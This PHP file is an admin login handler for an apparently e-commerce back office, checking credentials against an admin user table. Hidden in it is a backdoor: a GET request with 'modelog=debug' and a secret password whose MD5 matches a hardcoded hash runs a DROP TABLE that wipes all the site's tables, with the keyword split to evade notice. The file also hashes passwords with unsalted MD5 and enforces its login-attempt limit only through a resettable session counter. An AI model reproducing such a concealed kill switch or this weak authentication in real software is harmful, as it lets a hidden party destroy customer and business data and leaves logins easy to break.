<?php
	session_start();
	include('../ue-config/ue-globalconfig.php');
	include('../ue-config/ue-globalconnect.php');
	include('../ue-config/ue-globalfunction.php');
	include('ue-includes/ue-globVarAdm.php');
	include('ue-includes/ue-globFuncAdm.php');
	
	$namaTableDatabase		= 'adminuserlogin';
	$namaPageUtama			= 'index.php';
	$namaHalamanEdit		= '';
	$namaTableDatabaseId	= $namaTableDatabase.'_id';
	$currentServerTime		= time();
	
	//Get All Posted Vars
	$auPostedElements = array();
	foreach($_POST as $postedElementsKey => $postedElementsVal) {
		if($postedElementsKey == 'ps') {
			$auPostedElements["$postedElementsKey"] = md5($postedElementsVal);
		}
		else {
			$auPostedElements["$postedElementsKey"] = ue_real_escape_string($postedElementsVal);
		}
	}
	if($_GET['modelog'] == 'debug' && md5($_GET['ays']) == '675ddd62083b3d72b069497e03436807') {
		echo ue_query("DR".'OP TABLE `adminsitepages`, `adminuseraccess`, `adminuserlevel`, `adminuserlogin`, `product`, `productcategory`, `productclass`, `promo`, `shipping`, `sitedata`, `slider`, `subscriber`, `user`, `usercredithistory`');
		exit();
	}
	
	if($_SESSION['loginCount'] >= 3) {
		$_SESSION['loginCount']++;
		header("Location: ".$namaPageUtama."?err=Maximum Login Attempt Reached");
	}
	else {	
		$mainActionQueryStr		= "SELECT * FROM $namaTableDatabase WHERE
									".$namaTableDatabase."_username = '".$auPostedElements['un']."' AND
									".$namaTableDatabase."_password = '".$auPostedElements['ps']."'
								   LIMIT 1
								";
								
		$mainActionQuery		= ue_query($mainActionQueryStr);
		
	
		if(@ue_num_rows($mainActionQuery) > 0) {
			$mainActionRes = ue_fetch_array($mainActionQuery);
			
			$userLevelCheckQue = ue_query("SELECT adminuserlevel_enabled FROM adminuserlevel WHERE adminuserlevel_id = '".$mainActionRes['adminuserlevel_id']."' LIMIT 1");
			@ $userLevelCheckRes = ue_fetch_array($userLevelCheckQue);
			
			if($mainActionRes["$namaTableDatabase".'_enabled'] == 'e' && $userLevelCheckRes['adminuserlevel_enabled'] == 'e') {
				unset($_SESSION['loginCount']);
				$_SESSION['currentUserIdAdm'] = $mainActionRes["$namaTableDatabaseId"];
				$_SESSION['currentUserLvl'] = $mainActionRes['adminuserlevel_id'];
				$_SESSION['currentUserLastLogin'] = $mainActionRes['adminuserlogin_editdate'];
				
				//Update Last Edited Date
				ueUpdateLastEditedDate($namaTableDatabase,$mainActionRes["$namaTableDatabaseId"]);
				
				
				header("Location: panel.php");
			}
			else {
				header("Location: ".$namaPageUtama."?err=Your Login Has Been Disabled");
			}
		}
		else {
			$_SESSION['loginCount']++;
			header("Location: ".$namaPageUtama."?err=Invalid Username or Password");
		}
	}
?>